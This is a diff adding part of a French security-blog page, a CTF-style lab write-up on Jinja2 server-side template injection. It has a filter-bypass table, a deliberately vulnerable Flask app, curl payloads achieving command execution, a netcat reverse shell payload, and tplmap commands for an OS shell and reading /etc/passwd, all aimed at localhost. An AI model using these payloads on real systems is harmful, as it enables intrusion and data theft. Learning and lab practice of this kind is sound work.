+    <h3 class="subsection-title">Bypass récapitulatif</h3>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Filtre</th>
+            <th>Bypass</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td><code>__class__</code> bloqué</td><td><code>|attr("__class__")</code> ou <code>["__class__"]</code></td></tr>
+          <tr><td><code>.</code> bloqué</td><td>Bracket notation <code>["attr"]</code></td></tr>
+          <tr><td><code>_</code> bloqué</td><td><code>\x5f</code> ou via <code>request.args</code></td></tr>
+          <tr><td>Mots-clés bloqués</td><td><code>lipsum</code>, <code>cycler</code>, <code>joiner</code>, <code>namespace</code></td></tr>
+          <tr><td>Quotes bloquées</td><td><code>request.args.param</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- 06 - LAB -->
+  <section class="section" id="s6">
+    <div class="section-label">Phase <span>06</span></div>
+    <h2 class="section-title">Lab Pratique — CTF Simulation</h2>
+
+    <p>
+      Voilà le lab complet utilisé pour les captures de ce write-up — code vulnérable,
+      walkthrough d'exploitation, reverse shell et flag.
+    </p>
+
+    <h3 class="subsection-title">Setup du lab</h3>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Bash — setup</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm"># Installer Flask</span>
+pip install flask
+
+<span class="cm"># Créer le répertoire</span>
+mkdir ssti-lab && cd ssti-lab</pre>
+    </div>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Python — app.py (vulnérable)</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="kw">from</span> <span class="var">flask</span> <span class="kw">import</span> <span class="fn">Flask</span>, <span class="fn">request</span>, <span class="fn">render_template_string</span>
+<span class="kw">import</span> <span class="var">os</span>
+
+<span class="var">app</span> = <span class="fn">Flask</span>(__name__)
+<span class="var">app</span>.<span class="var">secret_key</span> = <span class="str">"MZ{SSTI_M4ST3R_2026}"</span>
+
+<span class="var">TEMPLATE</span> = <span class="str">"""
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;SSTI Lab&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Bienvenue sur le Greet App&lt;/h1&gt;
+  &lt;form method="GET"&gt;
+    &lt;input name="name" placeholder="Ton nom" value="{{ raw_name }}"&gt;
+    &lt;button type="submit"&gt;Envoyer&lt;/button&gt;
+  &lt;/form&gt;
+  &lt;p&gt;Résultat : RESULT_PLACEHOLDER&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+"""</span>
+
+<span class="kw">@app</span>.<span class="fn">route</span>(<span class="str">"/"</span>)
+<span class="kw">def</span> <span class="fn">index</span>():
+    <span class="var">name</span> = <span class="var">request</span>.<span class="var">args</span>.<span class="fn">get</span>(<span class="str">"name"</span>, <span class="str">"World"</span>)
+
+    <span class="cm"># ❌ Vulnérabilité SSTI — l'input est rendu comme template</span>
+    <span class="var">greeting</span> = <span class="fn">render_template_string</span>(<span class="str">f"Hello </span>{<span class="var">name</span>}<span class="str"> !"</span>)
+
+    <span class="var">output</span> = <span class="var">TEMPLATE</span>.<span class="fn">replace</span>(<span class="str">"RESULT_PLACEHOLDER"</span>, <span class="var">greeting</span>)
+    <span class="kw">return</span> <span class="fn">render_template_string</span>(<span class="var">output</span>, <span class="var">raw_name</span>=<span class="var">name</span>)
+
+<span class="kw">if</span> __name__ == <span class="str">"__main__"</span>:
+    <span class="var">app</span>.<span class="fn">run</span>(<span class="var">debug</span>=<span class="kw">False</span>, <span class="var">port</span>=<span class="num">5000</span>)</pre>
+    </div>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Bash — run</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="fn">python3</span> app.py
+<span class="muted"># App accessible sur http://127.0.0.1:5000</span></pre>
+    </div>
+
+    <h3 class="subsection-title">Walkthrough complet</h3>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <h4>Confirmer la vulnérabilité</h4>
+          <p>Voir captures de la phase 03 — <code>{{7*7}}</code> retourne 49, <code>{{7*'7'}}</code> retourne 7777777. Jinja2 confirmé.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <h4>RCE via joiner</h4>
+          <div class="code-wrap">
+            <div class="code-header">
+              <span class="code-lang">Bash — RCE</span>
+              <button class="copy-btn" onclick="copyCode(this)">copier</button>
+            </div>
+            <pre><span class="cm"># Exécuter 'id'</span>
+<span class="fn">curl</span> <span class="str">"http://127.0.0.1:5000/?name={{joiner.__init__.__globals__.os.popen('id').read()}}"</span>
+<span class="muted">→ Hello uid=1000(spectrax) gid=1000(spectrax) groups=1000(spectrax),10(wheel),964(docker) !</span>
+
+<span class="cm"># Lister les fichiers</span>
+<span class="fn">curl</span> <span class="str">"http://127.0.0.1:5000/?name={{joiner.__init__.__globals__.os.popen('ls -la').read()}}"</span>
+
+<span class="cm"># Lire app.py (contient le flag)</span>
+<span class="fn">curl</span> <span class="str">"http://127.0.0.1:5000/?name={{joiner.__init__.__globals__.os.popen('cat app.py').read()}}"</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <h4>Reverse shell — Setup du listener</h4>
+          <p>On prépare un listener netcat sur la machine attaquante.</p>
+          <div class="code-wrap">
+            <div class="code-header">
+              <span class="code-lang">Bash — listener</span>
+              <button class="copy-btn" onclick="copyCode(this)">copier</button>
+            </div>
+            <pre><span class="fn">nc</span> -lvnp <span class="num">4444</span>
+<span class="muted"># Ncat: Listening on :::4444
+# Ncat: Listening on 0.0.0.0:4444</span></pre>
+          </div>
+
+          <div class="terminal-frame">
+            <div class="terminal-bar">
+              <div class="t-dot t-dot-red"></div>
+              <div class="t-dot t-dot-amber"></div>
+              <div class="t-dot t-dot-green"></div>
+              <span class="terminal-bar-label">Terminal — Listener nc -lvnp 4444</span>
+            </div>
+            <div class="img-scroll"><img src="/ssti1/reverse-01-nc-setup.png" alt="Listener netcat démarré sur le port 4444" loading="lazy"></div>
+            <div class="terminal-caption">Ncat en écoute — prêt à recevoir la connexion sortante de la cible</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <h4>Reverse shell — Déclenchement via SSTI</h4>
+          <p>On envoie le payload qui force la cible à se connecter en retour vers notre listener.</p>
+          <div class="code-wrap">
+            <div class="code-header">
+              <span class="code-lang">Jinja2 — Reverse shell payload</span>
+              <button class="copy-btn" onclick="copyCode(this)">copier</button>
+            </div>
+            <pre><span class="payload">{{ joiner.__init__.__globals__.os.popen('nc 127.0.0.1 4444 -e /bin/bash').read() }}</span></pre>
+          </div>
+
+          <div class="terminal-frame">
+            <div class="terminal-bar">
+              <div class="t-dot t-dot-red"></div>
+              <div class="t-dot t-dot-amber"></div>
+              <div class="t-dot t-dot-green"></div>
+              <span class="terminal-bar-label">?name={{joiner...popen('nc 127.0.0.1 4444 -e /bin/bash').read()}}</span>
+            </div>
+            <div class="img-scroll"><img src="/ssti1/reverse-02-url.png" alt="URL du payload reverse shell dans le navigateur" loading="lazy"></div>
+            <div class="terminal-caption">Payload envoyé via le paramètre GET <code>name</code> — le serveur exécute la commande via <code>os.popen()</code></div>
+          </div>
+
+          <div class="terminal-frame">
+            <div class="terminal-bar">
+              <div class="t-dot t-dot-red"></div>
+              <div class="t-dot t-dot-amber"></div>
+              <div class="t-dot t-dot-green"></div>
+              <span class="terminal-bar-label">Terminal — Shell connecté</span>
+            </div>
+            <div class="img-scroll"><img src="/ssti1/reverse-03-ifconfig.png" alt="Shell interactif reçu — whoami et ifconfig exécutés avec succès" loading="lazy"></div>
+            <div class="terminal-caption">Shell connecté sur le listener — <code>whoami</code> → spectrax · <code>ifconfig</code> → dump des interfaces réseau</div>
+          </div>
+
+          <div class="result-badge">Reverse shell opérationnel — accès interactif au système compromis</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout callout-success">
+      <div class="callout-title">LAB COMPLÉTÉ</div>
+      <p>
+        Tu viens de passer de la détection SSTI à une RCE complète avec reverse shell.
+        Le flag était dans <code>app.py</code> (variable <code>secret_key</code>) — il est
+        souvent soit dans les fichiers sources, soit dans <code>/flag.txt</code>, soit dans
+        les variables d'environnement.
+      </p>
+    </div>
+
+    <h3 class="subsection-title">Outil automatisé — tplmap</h3>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Bash — tplmap</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre><span class="cm"># Installer tplmap</span>
+<span class="fn">git</span> clone https://github.com/epinna/tplmap
+<span class="fn">cd</span> tplmap && pip install -r requirements.txt
+
+<span class="cm"># Tester automatiquement</span>
+<span class="fn">python3</span> tplmap.py -u <span class="str">"http://127.0.0.1:5000/?name=INJECT"</span>
+
+<span class="cm"># OS shell interactif</span>
+<span class="fn">python3</span> tplmap.py -u <span class="str">"http://127.0.0.1:5000/?name=INJECT"</span> --os-shell
+
+<span class="cm"># Lire un fichier</span>
+<span class="fn">python3</span> tplmap.py -u <span class="str">"http://127.0.0.1:5000/?name=INJECT"</span> --os-cmd <span class="str">"cat /etc/passwd"</span></pre>
+    </div>
+  </section>
+
+  <!-- 07 - RESOURCES -->
+  <section class="section" id="s7">
+    <div class="section-label">Phase <span>07</span></div>
+    <h2 class="section-title">Ressources & Références</h2>
+
+    <p>
+      Une sélection de ressources pour approfondir le sujet — papers, documentation officielle,
+      outils, cheatsheets et labs pratiques.
+    </p>
+
+    <div class="ref-grid">
+      <a class="ref-card" href="https://portswigger.net/research/server-side-template-injection" target="_blank" rel="noopener">
+        <div class="ref-icon">📄</div>
+        <div class="ref-name">PortSwigger Research</div>
+        <div class="ref-url">Article original de James Kettle</div>
+      </a>
+      <a class="ref-card" href="https://jinja.palletsprojects.com/en/3.1.x/sandbox/" target="_blank" rel="noopener">
+        <div class="ref-icon">📚</div>
+        <div class="ref-name">Jinja2 Sandbox</div>
+        <div class="ref-url">Doc officielle — sandbox & limites</div>
+      </a>
+      <a class="ref-card" href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">
+        <div class="ref-icon">🤖</div>
+        <div class="ref-name">tplmap</div>
+        <div class="ref-url">Outil automatisé SSTI</div>
+      </a>
+      <a class="ref-card" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" target="_blank" rel="noopener">
+        <div class="ref-icon">📖</div>
+        <div class="ref-name">HackTricks SSTI</div>
+        <div class="ref-url">Cheatsheet complète multi-moteurs</div>
+      </a>
+      <a class="ref-card" href="https://www.root-me.org/" target="_blank" rel="noopener">
+        <div class="ref-icon">🎯</div>
+        <div class="ref-name">Root-Me — Web Server</div>
+        <div class="ref-url">Challenges SSTI à résoudre</div>
+      </a>
+      <a class="ref-card" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">
+        <div class="ref-icon">🎓</div>
+        <div class="ref-name">PortSwigger Academy</div>
+        <div class="ref-url">Labs interactifs guidés SSTI</div>
+      </a>
+    </div>
+
+    <div class="warn-badge">
+      Ces techniques ne doivent être pratiquées que sur des environnements légaux : plateformes CTF, labs dédiés (PortSwigger Academy, HackTheBox), ou avec autorisation écrite explicite.
+    </div>
+  </section>
+
+  <footer>
+    <div class="footer-author">
+      Rédigé par <strong style="color: var(--cyan);">SPECTRA MZ</strong>
+      &nbsp;·&nbsp; Security Research Blog &nbsp;·&nbsp; 2026
+      <br>
+      <a href="https://github.com/exploit4040">GitHub</a>
+      &nbsp;·&nbsp;
+      <a href="https://exploit4040.github.io/MZ/">Home</a>
+      &nbsp;·&nbsp;
+      <a href="https://whatsapp.com/channel/0029Vb80iXLJZg4CQBF0Fd31">LOCALHOST Channel</a>
+      <br>
+      <a class="bottom-back" href="../index.html">← Retour à l'accueil</a>
+    </div>
+    <div class="footer-badge">
+      <span>SSTI</span> Jinja2 · RCE · Reverse Shell
+    </div>
+  </footer>
+
+</div>
+</main>
+
+<script>
+  function copyCode(btn) {
+    const pre = btn.closest('.code-wrap').querySelector('pre');
+    const text = pre.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'copié ✓';
+      btn.style.borderColor = 'var(--cyan)';
+      btn.style.color = 'var(--cyan)';
+      setTimeout(() => {
+        btn.textContent = 'copier';
+        btn.style.borderColor = '';
+        btn.style.color = '';
+      }, 1800);
+    });
+  }
+
+  const sections = document.querySelectorAll('.section[id]');
+  const dots = document.querySelectorAll('.phase-dot');
+  const mobileItems = document.querySelectorAll('.mobile-nav-item');
+  const progressFill = document.getElementById('progressFill');
+
+  function updateActive() {
+    let current = '';
+    sections.forEach(sec => { if (window.scrollY + 200 >= sec.offsetTop) current = sec.id; });
+    dots.forEach(dot => dot.classList.toggle('active', dot.getAttribute('href') === '#' + current));
+    mobileItems.forEach(item => item.classList.toggle('active', item.getAttribute('href') === '#' + current));
+
+    const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = docHeight > 0 ? Math.min((window.scrollY / docHeight) * 100, 100) : 0;
+    progressFill.style.width = scrolled + '%';
+  }
+
+  window.addEventListener('scroll', updateActive, { passive: true });
+  window.addEventListener('resize', updateActive, { passive: true });
+  updateActive();
+
+  (function() {
+    var pageUrl = encodeURIComponent(window.location.href);
+    var pageTitle = encodeURIComponent(document.title);
+    var map = {
+      shareTwitter: 'https://twitter.com/intent/tweet?url=' + pageUrl + '&text=' + pageTitle,
+      shareLinkedin: 'https://www.linkedin.com/sharing/share-offsite/?url=' + pageUrl,
+      shareFacebook: 'https://www.facebook.com/sharer/sharer.php?u=' + pageUrl,
+      shareWhatsapp: 'https://wa.me/?text=' + pageTitle + '%20' + pageUrl,
+      shareTelegram: 'https://t.me/share/url?url=' + pageUrl + '&text=' + pageTitle,
+      shareReddit: 'https://www.reddit.com/submit?url=' + pageUrl + '&title=' + pageTitle
+    };
+    Object.keys(map).forEach(function(id) {
+      var el = document.getElementById(id);
+      if (el) el.href = map[id];
+    });
+    var copyBtn = document.getElementById('copyLinkBtn');
+    if (copyBtn) {
+      copyBtn.addEventListener('click', function() {
+        navigator.clipboard.writeText(window.location.href).then(function() {
+          copyBtn.classList.add('copied');
+          copyBtn.title = 'Copié ✓';
+          setTimeout(function() {
+            copyBtn.classList.remove('copied');
+            copyBtn.title = 'Copier le lien';
+          }, 1800);
+        });
+      });
+    }
+  })();
+</script>
+</body>
+</html>
